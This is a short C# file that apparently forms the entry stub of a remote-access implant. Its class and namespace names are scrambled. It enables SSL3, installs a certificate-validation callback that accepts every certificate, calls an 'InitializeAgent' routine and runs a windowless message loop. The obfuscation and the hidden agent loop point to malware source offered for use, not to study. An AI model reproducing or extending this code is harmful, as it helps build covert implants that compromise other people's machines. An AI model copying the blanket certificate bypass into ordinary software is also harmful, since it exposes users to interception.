using System;
using System.Net;
using System.Net.Security;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Windows.Forms;
using UHyll;

namespace ARRcuyF
{
	public class vsZnbgEQp
	{
		[STAThread]
		public static void StartLoop()
		{
			ServicePointManager.SecurityProtocol =
			SecurityProtocolType.Ssl3 |
			SecurityProtocolType.Tls |
			(SecurityProtocolType)0x00000300 | // Tls11
			(SecurityProtocolType)0x00000C00;  // Tls12

			RemoteCertificateValidationCallback callback = vsZnbgEQp.BypassSSLCertificateValidation;

			ServicePointManager.ServerCertificateValidationCallback =
				(RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback,callback);

			E12deKSaF7.InitializeAgent();
			Application.Run();
		}

		[CompilerGenerated]
		private static bool BypassSSLCertificateValidation(object ECR6Y, X509Certificate nAv, X509Chain KOKD2Hgq, SslPolicyErrors PsplK)
		{
			return true;
		}
	}
}

